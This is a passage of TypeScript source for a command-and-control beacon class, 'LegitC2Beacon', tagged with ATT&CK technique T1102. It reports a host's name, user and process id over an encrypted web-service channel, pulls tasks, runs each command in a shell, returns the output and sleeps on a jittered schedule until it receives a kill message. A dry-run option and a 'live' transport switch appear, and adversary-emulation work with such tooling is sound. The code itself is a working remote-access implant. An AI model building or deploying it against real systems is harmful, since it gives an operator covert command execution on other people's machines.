      { timeout: Math.round(EXEC_TIMEOUT * 1000), maxBuffer: OUTPUT_CAP * 2 },
      (error, stdout, stderr) => {
        if (error) {
          const timedOut = (error as NodeJS.ErrnoException).code === "ETIMEDOUT";
          if (timedOut) return resolve({ exit: -1, output: "", error: "command timed out" });
          return resolve({
            exit: typeof (error as { code?: unknown }).code === "number" ? Number((error as { code?: unknown }).code) : -1,
            output: String(stdout ?? "").slice(0, OUTPUT_CAP),
            error: String(stderr ?? error.message ?? "").slice(0, OUTPUT_CAP),
          });
        }
        resolve({
          exit: 0,
          output: String(stdout ?? "").slice(0, OUTPUT_CAP),
          error: String(stderr ?? "").slice(0, OUTPUT_CAP),
        });
      },
    );
  });
}

export class LegitC2Beacon {
  beaconId: string;
  transport: ServiceTransport;
  envelope: CryptoEnvelope;
  execute: ExecuteFn;
  host: string;
  user: string;
  pid: number;

  constructor(opts: {
    beaconId: string;
    transport: ServiceTransport;
    envelope?: CryptoEnvelope;
    execute?: ExecuteFn;
    host?: string;
    user?: string;
    pid?: number;
  }) {
    this.beaconId = opts.beaconId;
    this.transport = opts.transport;
    this.envelope = opts.envelope ?? new CryptoEnvelope();
    this.host = opts.host ?? process.env.HOSTNAME ?? "unknown";
    this.user = opts.user ?? process.env.USER ?? process.env.USERNAME ?? "unknown";
    this.pid = opts.pid ?? process.pid;
    this.execute = opts.execute ?? defaultExecute;
  }

  private async checkin(): Promise<void> {
    const payload = JSON.stringify({
      type: "checkin",
      beacon_id: this.beaconId,
      host: this.host,
      user: this.user,
      pid: this.pid,
      ts: Date.now() / 1000,
    });
    await this.transport.post(this.envelope.seal(payload), { sessionId: this.beaconId });
  }

  private async collectTasks(): Promise<Array<Record<string, unknown>>> {
    const tasks: Array<Record<string, unknown>> = [];
    const blobs = await this.transport.fetch({ sessionId: this.beaconId });
    for (const sealed of blobs) {
      let msg: Record<string, unknown>;
      try {
        msg = JSON.parse(this.envelope.open(sealed)) as Record<string, unknown>;
      } catch {
        continue; // malformed or wrong key — skip
      }
      if (msg["type"] === "task") tasks.push(msg);
      else if (msg["type"] === "kill") tasks.push({ type: "kill", beacon_id: msg["beacon_id"] ?? "" });
    }
    return tasks;
  }

  private async postResult(taskId: string, outcome: Record<string, unknown>): Promise<void> {
    const payload = JSON.stringify({
      type: "result",
      beacon_id: this.beaconId,
      task_id: taskId,
      output: outcome["output"] ?? "",
      exit: outcome["exit"] ?? -1,
      error: outcome["error"] ?? "",
      ts: Date.now() / 1000,
    });
    await this.transport.post(this.envelope.seal(payload), { sessionId: this.beaconId });
  }

  async runOnce(opts: { dryRun?: boolean; checkin?: boolean } = {}): Promise<Record<string, unknown>> {
    const { dryRun = false, checkin = true } = opts;
    if (checkin) await this.checkin();

    const tasks = await this.collectTasks();
    let executed = 0;
    let killed = false;

    for (const task of tasks) {
      if (task["type"] === "kill") {
        killed = true;
        break;
      }
      const command = String(task["command"] ?? "");
      const taskId = String(task["task_id"] ?? randomUUID().slice(0, 8));
      const outcome = await this.execute(command, dryRun);
      await this.postResult(taskId, outcome);
      executed += 1;
    }

    return {
      beacon_id: this.beaconId,
      executed,
      killed,
      drained: tasks.length,
      host: this.host,
      user: this.user,
      pid: this.pid,
    };
  }

  async runLoop(opts: {
    interval?: number;
    maxBeacons?: number;
    dryRun?: boolean;
    stop?: () => boolean;
    profile?: string;
  } = {}): Promise<Record<string, unknown>> {
    const { interval = 60, maxBeacons, dryRun = false, stop, profile } = opts;
    let totalExecuted = 0;
    let beacons = 0;
    let killed = false;
    const sleeps: number[] = [];

    while (maxBeacons === undefined || beacons < maxBeacons) {
      if (stop && stop()) break;
      const summary = (await this.runOnce({ dryRun })) as Record<string, unknown>;
      totalExecuted += Number(summary["executed"] ?? 0);
      beacons += 1;
      if (summary["killed"]) {
        killed = true;
        break;
      }
      if (maxBeacons !== undefined && beacons >= maxBeacons) break;
      const delay = nextBeaconInterval({ intervalSeconds: interval, profile, seed: beacons });
      sleeps.push(Number(delay.toFixed(2)));
      await new Promise((r) => setTimeout(r, delay * 1000));
    }

    return {
      beacon_id: this.beaconId,
      total_executed: totalExecuted,
      beacons,
      killed,
      profile: profile ?? "fixed",
      sleeps: sleeps.slice(0, 10),
    };
  }

  probe(): Record<string, unknown> {
    return {
      beacon_id: this.beaconId,
      transport: this.transport.name,
      host: this.host,
      user: this.user,
      pid: this.pid,
      technique_id: "T1102",
      note: "set live=true on the transport to connect",
    };
  }
}
